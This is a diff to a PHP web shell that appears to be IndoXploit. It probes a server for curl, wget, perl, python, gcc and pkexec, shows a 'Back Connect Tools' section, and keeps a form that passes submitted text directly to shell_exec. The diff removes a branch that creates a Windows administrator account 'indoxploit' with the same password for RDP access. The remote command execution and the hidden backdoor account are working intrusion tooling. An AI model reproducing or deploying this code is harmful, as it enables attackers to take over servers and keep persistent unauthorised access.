@@ -1,4 +1,5 @@
 <?php
+$dir = getcwd();
 $curl = (function_exists('curl_version')) ? "ON" : "OFF";
 $wget = (@shell_exec('wget --help')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
 $perl = (@shell_exec('perl --help')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
@@ -11,16 +12,7 @@ echo php_uname();
 echo "<br>CURL : ".$curl.", WGET : ".$wget;
 echo ", PERL : ".$perl.", RUBY : ".$ruby.", PYTHON : ".$python.", GCC : ".$gcc.", PKEXEC : ".$pkexec."<br>";
 
-if(isset($_GET["cmd"])) {
-  echo "<form method='post'>
-       <label for='cmd'>Command: </label>
-       <input type='text' name='cmd' id='cmd' autocomplete='off'>
-       <input type='submit' name='exec' value='Exec'>
-       </form>";
-  if(isset($_POST["exec"])) {
-    echo "<textarea style='height:135px ;width:455px;'>".@shell_exec($_POST["cmd"])."</textarea>";
-  }
-} elseif(isset($_GET["network"])) {
+if(isset($_GET["network"])) {
   echo "<h4 class='text-center mb-4'>Back Connect Tools</h4>
     <form method='post'>
         <div class='row'>
@@ -110,50 +102,14 @@ if(isset($_GET["cmd"])) {
         }
     }
     exit;
-} elseif(isset($_GET["krdp"])) {
-  $args = explode(" ", $args);
-  $os = (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
-  if($os !== "Windows") die("Not windows");
-  
-  if(preg_match("/indoxploit/", system("net user"))) die(color(1, 1, "[INFO] username 'indoxploit' already exists."));
-  
-  $add_user   = system("net user indoxploit indoxploit /add");
-  $add_groups1 = system("net localgroup Administrators indoxploit /add");
-  $add_groups2 = system("net localgroup Administrator indoxploit /add");
-  $add_groups3 = system("net localgroup Administrateur indoxploit /add");
-  
-  print "[ RDP ACCOUNT INFO ]<br>
-      	------------------------------<br>
-      	IP: ".$GLOBALS['SERVERIP']."<br>
-      	Username: indoxploit <br>
-      	Password: indoxploit <br>
-      	------------------------------<br><br>
-      	[ STATUS ]<br>
-      	------------------------------<br>
-      	";
-  
-   if($add_user) {
-    print "[add user] -> SUCCESS <br>";
-  } 
-  else {
-    print "[add user] -> FAILED <br>";
+} elseif(isset($_GET["cmd"])) {
+  echo "<form method='post'>
+       <label for='cmd'>Command: </label>
+       <input type='text' name='cmd' id='cmd' autocomplete='off'>
+       <input type='submit' name='exec' value='Exec'>
+       </form>";
+  if(isset($_POST["exec"])) {
+    echo "<textarea style='height:135px ;width:455px;'>".@shell_exec($_POST["cmd"])."</textarea>";
   }
-      	
-  if($add_groups1) {
-    print "[add localgroup Administrators] -> SUCCESS <br>";
-  } 
-  elseif($add_groups2) {
-    print "[add localgroup Administrator] -> SUCCESS <br>";
-  } 
-  elseif($add_groups3) { 
-    print "[add localgroup Administrateur] -> SUCCESS <br>";
-  } 
-  else {
-    print "[add localgroup] -> FAILED <br>";
-  }
-  
-  print "------------------------------<br>";
-} else {
-  echo "Toolkit";
 }
 ?>
